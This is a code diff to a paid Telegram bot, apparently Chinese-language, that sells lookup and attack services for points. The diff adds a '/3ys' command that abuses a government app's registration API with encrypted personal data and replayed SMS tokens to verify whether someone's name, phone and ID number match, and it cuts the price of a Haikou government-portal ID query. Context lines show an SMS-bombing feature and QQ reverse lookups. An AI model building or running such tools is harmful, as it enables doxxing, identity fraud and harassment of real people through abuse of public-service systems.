@@ -28,6 +28,14 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Updater, CommandHandler, ConversationHandler, MessageHandler, Filters, CallbackQueryHandler
 from flask import Flask, request, jsonify
 
+# ---------- 新增：GMSSL 支持（三要素核验用到） ----------
+try:
+    from gmssl.sm2 import CryptSM2
+    GMSSL_AVAILABLE = True
+except ImportError:
+    GMSSL_AVAILABLE = False
+    print("⚠️ 未安装 gmssl，/3ys 命令将无法使用，请先 pip install gmssl")
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('MergedBot')
@@ -54,11 +62,15 @@ CHECK_INTERVAL = 0.5
 ORDER_TIMEOUT = 1800
 ADMIN_IDS = [6040143940]
 
-# 收费常量
-HN_COST = 999.0      # 海南查询
-GX_COST = 999.0      # 广西查询
-KHZC_COST = 1.0      # 空号检测
-YS_COST = 1.0        # 二要素
+# 收费常量（已修改）
+HN_COST = 1.0          # 海南查询（改为1积分）
+GX_COST = 999.0        # 广西查询
+KHZC_COST = 1.0        # 空号检测
+YS_COST = 1.0          # 二要素
+THREE_COST = 1.0       # 新增三要素核验
+
+# ---------- 三要素核验所需常量 ----------
+PUBLIC_KEY = "04be7a5cfde4e83a21efb711dec86f5e6b253a9e3927540bf854439229e2e7eb1cd0dc3de522c90eb7ab639d93094fac219ffcde544c39ec2bd908436fa35f0088"
 
 # ===== JSON存储 =====
 USERS_FILE = "users.json"
@@ -149,7 +161,7 @@ def get_font(font_path, size):
         _FONT_CACHE[key] = ImageFont.truetype(font_path, size)
     return _FONT_CACHE[key]
 
-# ===== 身份证生成 =====
+# ===== 身份证生成（略，不变） =====
 HEADERS1 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","zwfw-token":ZWFW_TOKEN,"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","content-type":"application/json","sec-ch-ua-mobile":"?1","Accept":"*/*","Origin":"https://zwfw.dn.haikou.gov.cn","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 HEADERS2 = {"Host":"zwfw.dn.haikou.gov.cn","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"","User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.119 Mobile Safari/537.36 AgentWeb/5.0.0  yssApp","sec-ch-ua":"\"Android WebView\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"","sec-ch-ua-mobile":"?1","Accept":"*/*","X-Requested-With":"com.hanweb.hnzwfw.android.activity","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://zwfw.dn.haikou.gov.cn/portal_h5/wsbl?id=1047370300041120912&step=B&certifyId=undefined","Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
 def query_id_card_sync(id_card):
@@ -404,6 +416,8 @@ GX_NAME, GX_ID, GX_PHONE, GX_CAPTCHA, GX_SMS = range(400, 405)
 KHZC_PHONE = 500
 SFZ_NAME,SFZ_ID,SFZ_NATION,SFZ_ADDR,SFZ_EXPIRY,SFZ_PHOTO=range(6)
 PLC_NAME,PLC_ID,PLC_ADDR_CONFIRM,PLC_ADDR_MANUAL,PLC_PHOTO=range(10,15)
+# ---------- 新增三要素状态 ----------
+THREE_NAME, THREE_PHONE, THREE_ID = range(600, 603)
 
 # ===== 代理池功能（修改为只测前3个） =====
 def test_proxy(proxy):
@@ -456,6 +470,7 @@ def start(update, context):
            f"/gx → 广西头（{GX_COST}积分）\n"
            f"/khzc → 空号检测（{KHZC_COST}积分）\n"
            f"/2ys → 二要素核实（{YS_COST}积分）\n"
+           f"/3ys → 三要素核验（{THREE_COST}积分）\n"  # 新增
            f"/qf → QQ反查历史\n"
            f"/sms → 短信轰炸\n"
            f"/okcz → USDT充值积分\n"
@@ -880,6 +895,121 @@ def ys_id(update, context):
         update.message.reply_text(f"❌ 请求出错：{e}")
     context.user_data.clear()
     return ConversationHandler.END
+
+# ===== /3ys 三要素核验（新增，1积分/次） =====
+def three_start(update, context):
+    context.user_data.clear()
+    uid = update.effective_user.id
+    ensure_user(uid)
+    stats = get_user_stats(uid)
+    if stats['points'] < THREE_COST:
+        update.message.reply_text(f"❌ 积分不足，需要 {THREE_COST} 积分，当前 {stats['points']:.2f}")
+        return ConversationHandler.END
+    # 先扣除积分
+    users[str(uid)]['points'] = stats['points'] - THREE_COST
+    save_users()
+    update.message.reply_text(f"✅ 已扣除 {THREE_COST} 积分，剩余 {users[str(uid)]['points']:.2f}\n请输入姓名：")
+    return THREE_NAME
+
+def three_name(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    name = update.message.text.strip()
+    if not name:
+        update.message.reply_text("姓名不能为空，请重新输入：")
+        return THREE_NAME
+    context.user_data['three_name'] = name
+    update.message.reply_text("请输入手机号（11位）：")
+    return THREE_PHONE
+
+def three_phone(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    phone = update.message.text.strip()
+    if not phone.isdigit() or len(phone) != 11:
+        update.message.reply_text("手机号格式错误（需11位数字），请重新输入：")
+        return THREE_PHONE
+    context.user_data['three_phone'] = phone
+    update.message.reply_text("请输入18位身份证号：")
+    return THREE_ID
+
+def three_id(update, context):
+    if update.message.text and update.message.text.startswith('/'):
+        context.user_data.clear()
+        update.message.reply_text("⏹️ 已取消")
+        return ConversationHandler.END
+    id_card = update.message.text.strip().upper()
+    if len(id_card) != 18 or not (id_card[:17].isdigit() and id_card[-1] in '0123456789X'):
+        update.message.reply_text("身份证号格式错误，请重新输入：")
+        return THREE_ID
+
+    # 收集所有信息
+    name = context.user_data.get('three_name')
+    phone = context.user_data.get('three_phone')
+    if not name or not phone:
+        update.message.reply_text("会话信息丢失，请重新 /3ys")
+        context.user_data.clear()
+        return ConversationHandler.END
+
+    # 执行核验
+    update.message.reply_text("⏳ 正在核验运营商三要素，请稍候...")
+    result_msg = check_three_elements(name, phone, id_card)
+    update.message.reply_text(result_msg)
+    context.user_data.clear()
+    return ConversationHandler.END
+
+def check_three_elements(name, phone, id_card):
+    """调用运营商三要素核验接口"""
+    if not GMSSL_AVAILABLE:
+        return "❌ 缺少 gmssl 库，无法加密，请先 pip install gmssl"
+    try:
+        sm2 = CryptSM2(public_key=PUBLIC_KEY, private_key="")
+        sm2.mode = 1
+        def encrypt(plain: str) -> str:
+            return "04" + sm2.encrypt(plain.encode("utf-8")).hex()
+
+        url = "https://app.btzwfw.cn/api/open-api/sso/app/oauth2/register"
+        headers = {
+            "Content-Type": "application/json",
+            "platform": "mp-weixin",
+            "cudt-app": "unicom",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 MicroMessenger/7.0.20.1781 MiniProgramEnv/Windows",
+        }
+        body = {
+            "person": {
+                "name": encrypt(name),
+                "idName": encrypt(name),
+                "idType": "111",
+                "idCardNum": encrypt(id_card),
+                "idPhone": encrypt(phone),
+                "idPwd": encrypt("Abc@123456"),
+                "confirmPwd": encrypt("Abc@123456"),
+                "userSex": "M",
+                "gender": "M",
+                "effDate": "2023-01-01",
+                "expDate": "2043-01-01",
+                "msgId": "04843730249223a7adfc20ed56681bbf8e8c2baa1c83fadd849c27c741c0c8d230ef3d1a2f9052b85611db728f2465b24cbaed9a0cb0953bb5d103879f5617b0c76aff530b65f976acbd6e1bf43ddadc71a381e83b0dd0736317a6b01c03e9ef8a2fb2c08f1a832dbaddf3e9630378c5ec4b315c4b5011ad3aee2c0fdbe1fd9dfe",
+                "smsCode": "04322e8f0ab6f5e71562c69625edf58557dbdce2d4bdb40e3389e2b1b05cc39f5de54d8f040ac7be1d3df860c27bf0fbfa7792c5f3a197dd89237942922c450424593cec0f8d9931fcca804dd7c5544f5eea3a54b4e0835b9fed13aee3c8f374376c7bd3f8f6ea",
+                "source": "7",
+            },
+            "userType": "1",
+        }
+        resp = requests.post(url, json=body, headers=headers, timeout=30)
+        data = resp.json()
+        code = data.get("code")
+        status = data.get("status")
+        msg = data.get("message") or data.get("msg", "")
+
+        if status == "success" and code != 500:
+            return f"✅ {name} {phone} {id_card} 运营商三要素核验成功 {msg}"
+        else:
+            return f"❌ {name} {phone} {id_card} 运营商三要素核验失败 {msg}"
+    except Exception as e:
+        return f"❌ {name} {phone} {id_card} 核验出错：{str(e)}"
 
 # ===== /sms 短信轰炸 =====
 def do_sms_attack(chat_id, bot, target_count, phone, user_id):
@@ -1413,7 +1543,7 @@ def gx_sms(update, context):
     context.user_data.clear()
     return ConversationHandler.END
 
-# ===== /hn 海南查询 =====
+# ===== /hn 海南查询（已改1积分） =====
 def hn(update, context):
     context.user_data.clear()
     args=context.args
@@ -1571,6 +1701,18 @@ def main():
         states={
             YS_NAME: [MessageHandler(Filters.text, ys_name)],
             YS_ID: [MessageHandler(Filters.text, ys_id)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+        allow_reentry=True
+    ))
+
+    # ---------- 新增：/3ys 三要素核验 ----------
+    dp.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('3ys', three_start)],
+        states={
+            THREE_NAME: [MessageHandler(Filters.text & ~Filters.command, three_name)],
+            THREE_PHONE: [MessageHandler(Filters.text & ~Filters.command, three_phone)],
+            THREE_ID: [MessageHandler(Filters.text & ~Filters.command, three_id)],
         },
         fallbacks=[CommandHandler('cancel', cancel)],
         allow_reentry=True
